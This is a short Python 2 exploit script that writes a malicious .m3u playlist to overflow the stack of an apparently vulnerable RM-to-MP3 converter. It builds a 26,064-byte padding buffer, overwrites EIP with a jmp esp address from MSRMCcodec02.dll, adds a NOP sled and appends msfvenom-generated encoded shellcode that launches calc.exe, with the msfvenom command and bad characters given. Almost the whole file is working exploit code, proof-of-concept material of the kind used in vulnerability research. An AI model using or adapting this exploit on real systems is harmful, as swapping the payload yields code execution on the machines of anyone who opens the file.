#!/usr/bin/python
# NOTE: to trigger command execution, drag .m3u file to the Desktop before opening in the vulnerable application :)

import struct

buffer = "A" * (25000 + 1064)

eip = struct.pack('<I', 0x01D2F23A) #jmp esp from MSRMCcodec02.dll

preshellcode = "\x90" * 25

# bad characters: \x00\x0a

# msfvenom -p windows/exec cmd=calc.exe -f c EXITFUNC=seh -e x86/shikata_ga_nai -b "x00x0a" -a x86 --platform windows

shellcode = ("\xba\x68\x30\x84\x34\xda\xd6\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x31\x31\x57\x13\x83\xef\xfc\x03\x57\x67\xd2\x71\xc8\x9f\x90"
"\x7a\x31\x5f\xf5\xf3\xd4\x6e\x35\x67\x9c\xc0\x85\xe3\xf0\xec"
"\x6e\xa1\xe0\x67\x02\x6e\x06\xc0\xa9\x48\x29\xd1\x82\xa9\x28"
"\x51\xd9\xfd\x8a\x68\x12\xf0\xcb\xad\x4f\xf9\x9e\x66\x1b\xac"
"\x0e\x03\x51\x6d\xa4\x5f\x77\xf5\x59\x17\x76\xd4\xcf\x2c\x21"
"\xf6\xee\xe1\x59\xbf\xe8\xe6\x64\x09\x82\xdc\x13\x88\x42\x2d"
"\xdb\x27\xab\x82\x2e\x39\xeb\x24\xd1\x4c\x05\x57\x6c\x57\xd2"
"\x2a\xaa\xd2\xc1\x8c\x39\x44\x2e\x2d\xed\x13\xa5\x21\x5a\x57"
"\xe1\x25\x5d\xb4\x99\x51\xd6\x3b\x4e\xd0\xac\x1f\x4a\xb9\x77"
"\x01\xcb\x67\xd9\x3e\x0b\xc8\x86\x9a\x47\xe4\xd3\x96\x05\x62"
"\x25\x24\x30\xc0\x25\x36\x3b\x74\x4e\x07\xb0\x1b\x09\x98\x13"
"\x58\xeb\x69\xae\x74\x7c\xd0\x5b\x35\xe0\xe3\xb1\x79\x1d\x60"
"\x30\x01\xda\x78\x31\x04\xa6\x3e\xa9\x74\xb7\xaa\xcd\x2b\xb8"
"\xfe\xad\xaa\x2a\x62\x1c\x49\xcb\x01\x60")

with open("rm2mp3.m3u", "w+") as f:
    f.write(buffer + eip + preshellcode + shellcode)

print "m3u File Created Successfully\n"
	
